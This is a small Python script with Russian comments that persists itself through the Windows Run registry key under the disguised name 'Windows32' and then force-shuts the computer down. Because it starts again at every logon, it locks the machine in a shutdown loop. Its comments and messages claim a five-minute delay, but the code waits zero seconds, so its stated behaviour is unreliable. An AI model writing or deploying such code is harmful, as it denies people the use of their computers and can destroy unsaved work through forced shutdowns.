import os
import time
import subprocess
import winreg as reg
import sys
from pathlib import Path

# Путь к текущему файлу .exe (который будет добавлен в автозагрузку)
current_file_path = os.path.realpath(__file__)
app_name = "Windows32"

# Функция для добавления программы в автозагрузку
def add_to_autostart():
    try:
        # Открытие реестра Windows для добавления в автозагрузку
        key = reg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, current_file_path)
        reg.CloseKey(reg_key)
        print("Программа добавлена в автозагрузку.")
    except Exception as e:
        print(f"Не удалось добавить в автозагрузку: {e}")

# Функция для выключения ПК через 5 минут
def shutdown_computer():
    try:
        print("ПК будет выключен через 5 минут...")
        subprocess.run(["shutdown", "/s", "/f", "/t", "0"], shell=True)
    except Exception as e:
        print(f"Ошибка при попытке выключения ПК: {e}")

# Основная функция
def main():
    # Добавление программы в автозагрузку
    add_to_autostart()

    # Задержка 5 минут перед выключением ПК
    time.sleep(0)  # 5 минут = 5 * 60 секунд

    # Выполнение выключения компьютера
    shutdown_computer()

if __name__ == "__main__":
    main()
